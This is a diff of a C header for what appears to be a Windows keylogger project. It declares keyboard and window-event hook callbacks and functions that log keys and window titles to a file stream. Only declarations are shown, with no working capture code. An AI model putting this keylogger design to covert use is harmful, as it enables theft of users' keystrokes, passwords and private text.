@@ -9,13 +9,6 @@
 # include <stdint.h>
 # include <stdlib.h>
 
-const char *special_codes[] =
-{
-	[VK_BACK]				= "\\b",
-	[VK_TAB]				= "\\t",
-	[VK_RETURN]				= "\\n"
-};
-
 # define WINDOW_TITLE_SIZE 256
 
 typedef struct		s_winkey
@@ -26,5 +19,15 @@ typedef struct		s_winkey
 	char			window_prev[WINDOW_TITLE_SIZE];
 	FILE			*stream;
 }					t_winkey;
+
+extern t_winkey g_winkey;
+
+/* log.c */
+void		log_window(SYSTEMTIME st, char *window_name);
+void		log_key(char *buffer, char *ptr);
+
+/* hook.c */
+LRESULT __stdcall hook_callback(int n_code, WPARAM w_param, LPARAM l_param);
+LRESULT __stdcall win_event_proc_callback(HWINEVENTHOOK hWinEventHook, DWORD dwEvent, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);
 
 #endif
